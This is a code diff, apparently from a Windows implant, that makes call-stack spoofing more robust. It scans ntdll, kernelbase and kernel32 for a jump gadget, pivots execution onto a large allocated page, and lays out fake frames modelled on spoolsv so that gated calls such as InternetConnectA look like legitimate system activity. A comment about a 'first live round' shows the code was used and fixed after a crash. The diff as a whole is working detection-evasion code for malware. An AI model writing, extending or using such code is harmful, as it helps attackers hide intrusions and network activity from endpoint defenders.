@@ -80,35 +80,39 @@ int gate_api_enabled(int api_bit)
  * back to the recovery stub. */
 static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long * out_extent)
 {
-	unsigned char * base;
-	IMAGE_NT_HEADERS * nt;
-	IMAGE_SECTION_HEADER * sec;
-	int i;
-	unsigned char * p;
-	unsigned char * end;
+	const char * mods[3] = { "ntdll.dll", "kernelbase.dll", "kernel32.dll" };
+	int m;
 
-	base = (unsigned char *)GetModuleHandleA("ntdll.dll");
-	if (base == NULL)
-		return FALSE;
-	nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
-	sec = IMAGE_FIRST_SECTION(nt);
-	for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
-		if (memcmp(sec->Name, ".text", 5) != 0)
+	for (m = 0; m < 3; m++) {
+		unsigned char * base = (unsigned char *)GetModuleHandleA(mods[m]);
+		IMAGE_NT_HEADERS * nt;
+		IMAGE_SECTION_HEADER * sec;
+		int i;
+		unsigned char * p;
+		unsigned char * end;
+
+		if (base == NULL)
 			continue;
-		p = base + sec->VirtualAddress;
-		end = p + sec->Misc.VirtualSize - 5;
-		for (; p < end; p++) {
-			DWORD sz = 0;
-			if (p[0] != 0xFF || p[1] != 0x65 || p[2] != 0xF8)
+		nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
+		sec = IMAGE_FIRST_SECTION(nt);
+		for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+			if (memcmp(sec->Name, ".text", 5) != 0)
 				continue;
-			/* extent from the gadget address through its function frame */
-			if (!g3_gate_frame_size_at((unsigned long long)p, &sz))
-				continue;
-			if (sz < 0x48 || sz > 0x400)
-				continue;
-			*out_gadget = (unsigned long long)p;
-			*out_extent = sz;
-			return TRUE;
+			p = base + sec->VirtualAddress;
+			end = p + sec->Misc.VirtualSize - 5;
+			for (; p < end; p++) {
+				DWORD sz = 0;
+				if (p[0] != 0xFF || p[1] != 0x65 || p[2] != 0xF8)
+					continue;
+				/* extent from the gadget address through its function frame */
+				if (!g3_gate_frame_size_at((unsigned long long)p, &sz))
+					continue;
+				if (sz < 0x48 || sz > 0x400)
+					continue;
+				*out_gadget = (unsigned long long)p;
+				*out_extent = sz;
+				return TRUE;
+			}
 		}
 	}
 	return FALSE;
@@ -125,26 +129,29 @@ static void gate_init_spoof(void)
 	if (g_gate_spoof_ready != 0)
 		return;
 
-	g_gate_page = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	g_gate_page = (unsigned char *)VirtualAlloc(NULL, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (g_gate_page == NULL) {
+		KD("gate: plain (no page)", 0);
 		g_gate_spoof_ready = 2;
 		return;
 	}
 	if (!g3_gate_frames(fr, sizes)) {
+		KD("gate: plain (frames fail)", 0);
 		g_gate_spoof_ready = 2;
 		return;
 	}
 	if (!gate_find_gadget(&gadget, &extent)) {
+		KD("gate: plain (no gadget)", 0);
 		g_gate_spoof_ready = 2;
 		return;
 	}
 
-	/* pivot: page + 0x48 (= 8 mod 16, x64 ABI at fn entry). The area
-	 * [pivot+0x28, pivot+0x48) holds up to 4 stack args (page is fresh
-	 * zero). The gadget frame extends `extent` bytes up from the pivot;
-	 * the spoolsv chain starts at the frame boundary and each frame's
-	 * retaddr sits at the boundary of the previous frame's extent. */
-	g_gate_pivot = (unsigned long long)g_gate_page + 0x48;
+	/* pivot: page + 0x8000 (= 8 mod 16, x64 ABI at fn entry). The gated
+	 * call's ENTIRE call tree runs on this stack and grows DOWN from the
+	 * pivot - 32KB headroom below, chain laid above toward the page top.
+	 * (The first live round used page+0x48: 0x48 bytes of headroom could
+	 * not hold InternetConnectA's deep tree.) */
+	g_gate_pivot = (unsigned long long)g_gate_page + 0x8000;
 	slot = g_gate_pivot + extent;
 	for (i = 0; i < 4; i++) {
 		*(unsigned long long *)slot = fr[i];
